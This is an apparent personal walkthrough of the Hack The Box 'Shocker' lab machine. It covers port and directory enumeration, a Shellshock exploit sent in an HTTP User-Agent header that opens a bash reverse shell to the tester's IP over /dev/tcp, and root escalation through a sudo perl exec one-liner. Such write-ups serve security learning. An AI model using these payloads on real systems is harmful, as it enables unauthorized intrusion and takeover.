#linux 
# Enumeration
## Nmap port scanning

```
nmap -sC -sV shocker.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 00:52 EST
Nmap scan report for shocker.htb (10.129.212.59)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds
                                                               
```

## Gobuster
```
gobuster dir -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/16 00:54:01 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]
Progress: 4594 / 4615 (99.54%)===============================================================
2023/02/16 00:55:30 Finished
===============================================================
```

CGI program???
/cgi-bin/ is a directory

## Feroxbuster
```
feroxbuster -u http://shocker.htb -f -n          
403      GET       11l       32w      294c http://shocker.htb/cgi-bin/
200      GET        9l       13w      137c http://shocker.htb/
403      GET       11l       32w      292c http://shocker.htb/icons/
403      GET       11l       32w      300c http://shocker.htb/server-status/
```

```
feroxbuster -u http://shocker.htb/cgi-bin/ -x sh,cgi,pl
403      GET       11l       32w      294c http://shocker.htb/cgi-bin/
200      GET        7l       18w        0c http://shocker.htb/cgi-bin/user.sh
```

## Visit the website



![[Pasted image 20230216150000.png]]
### /cgi-bin
```
cat user.sh     
Content-Type: text/plain

Just an uptime test script

 01:42:53 up 53 min,  0 users,  load average: 0.11, 0.07, 0.02
```

### uptime command on kali machine
```
┌──(kali㉿kali)-[~/Documents/htb/linux-machine/shocker]
└─$ uptime             
 01:47:34 up 57 min,  2 users,  load average: 0.01, 0.12, 0.09
```


# Foothold
## Shellshock


![[Pasted image 20230216172207.png]]

### ping
`sudo tcpdump -i tun0 icmp` 
```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
03:27:44.284886 IP shocker.htb > 10.10.14.36: ICMP echo request, id 1595, seq 1, length 64
03:27:44.284907 IP 10.10.14.36 > shocker.htb: ICMP echo reply, id 1595, seq 1, length 64
```

### RCE
```
GET /cgi-bin/user.sh HTTP/1.1
Host: shocker.htb
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.36/1234 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Revere shell
Through burp suite, run the code above and listen on nc
```
nc -lnvp 1234            
listening on [any] 1234 ...
connect to [10.10.14.36] from (UNKNOWN) [10.129.212.59] 46762
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

### User flag
```
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
```


# Priv escalation
## Sudo -l
```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

### perl
https://gtfobins.github.io/gtfobins/perl/


```
sudo perl -e 'exec "/bin/sh";'
```

## Get flag
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
whoami
root
```
there is a flag under /root
